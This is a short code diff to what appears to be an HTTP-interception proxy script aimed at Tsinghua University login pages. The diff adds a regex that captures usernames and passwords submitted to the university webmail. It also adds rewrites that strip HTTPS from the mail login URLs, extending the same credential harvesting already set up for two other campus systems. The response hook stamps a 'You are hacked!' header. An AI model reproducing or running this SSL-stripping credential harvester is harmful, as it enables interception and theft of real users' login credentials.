@@ -6,11 +6,14 @@ from PIL import Image
 
 PASSWORD_REGEXS = [
   ('learn', re.compile('userid=(?P<username>.+)&userpass=(?P<password>.+)&submit')),
-  ('zhjwxk', re.compile('j_username=(?P<username>.+)&j_password=(?P<password>.+)&captchaflag'))
+  ('zhjwxk', re.compile('j_username=(?P<username>.+)&j_password=(?P<password>.+)&captchaflag')),
+  ('mail', re.compile('uid=(?P<username>.+)&password=(?P<password>.+)&domain'))
 ]
 URL_TRANSFORMS = [
   (b'https://learn.tsinghua.edu.cn/MultiLanguage/lesson/teacher/loginteacher.jsp', b'http://learn.tsinghua.edu.cn/MultiLanguage/lesson/teacher/loginteacher.jsp'),
   (b'https://zhjwxk.cic.tsinghua.edu.cn:443/j_acegi_formlogin_xsxk.do', b'http://zhjwxk.cic.tsinghua.edu.cn/j_acegi_formlogin_xsxk.do'),
+  (b'https://mails.tsinghua.edu.cn/coremail/index.jsp', b'http://mails.tsinghua.edu.cn/coremail/index.jsp'),
+  (b'https://mail.tsinghua.edu.cn/coremail/index.jsp', b'http://mail.tsinghua.edu.cn/coremail/index.jsp'),
   (b'twd15,15', b'equipment,15')
 ]
 
@@ -36,7 +39,6 @@ class Trans:
 
   def response(self, flow):
     flow.response.headers['x-twd2-message'] = 'You are hacked!'
-    # print('hacking tsinghua.edu.cn')
     for old, new in URL_TRANSFORMS:
       try:
         flow.response.content = flow.response.content.replace(old, new)
